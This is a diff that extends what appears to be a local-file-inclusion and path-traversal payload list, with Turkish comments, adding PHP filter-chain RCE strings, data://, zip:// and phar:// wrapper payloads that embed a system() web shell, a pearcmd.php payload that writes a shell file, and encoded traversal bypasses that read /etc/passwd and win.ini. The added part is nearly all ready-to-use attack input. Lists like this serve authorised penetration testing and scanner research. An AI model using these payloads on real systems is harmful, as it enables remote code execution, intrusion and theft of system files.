@@ -467,3 +467,25 @@ http://169.254.0.1/
 /%2e%2e/WEB-INF/web.xml
 /..%2fWEB-INF/web.xml
 /..%5cWEB-INF/web.xml
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# PHP filter chain RCE (dosya yazmadan — Synacktiv/Gynvael tekniği)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd
+php://filter/convert.iconv.L1.UCS-4LE|convert.iconv.UCS-4LE.L1/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=php://temp
+# data:// & expect:// & phar:// & zip:// wrapper RCE
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+data://text/plain,<?php system($_GET[c]);?>
+zip://shell.zip%23payload.php
+phar://shell.phar/test.txt
+# pearcmd.php RCE (register_argc_argv aktifken)
+/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[c])?>+/tmp/x.php
+# /proc tabanlı + session poisoning
+/var/lib/php/sessions/sess_FUZZ
+# çoklu encoding / off-by-slash / nginx alias bypass
+....//....//....//etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..;/..;/..;/etc/passwd
+/static../../../etc/passwd
+/etc/passwd%00.png
+\\?\C:\windows\win.ini
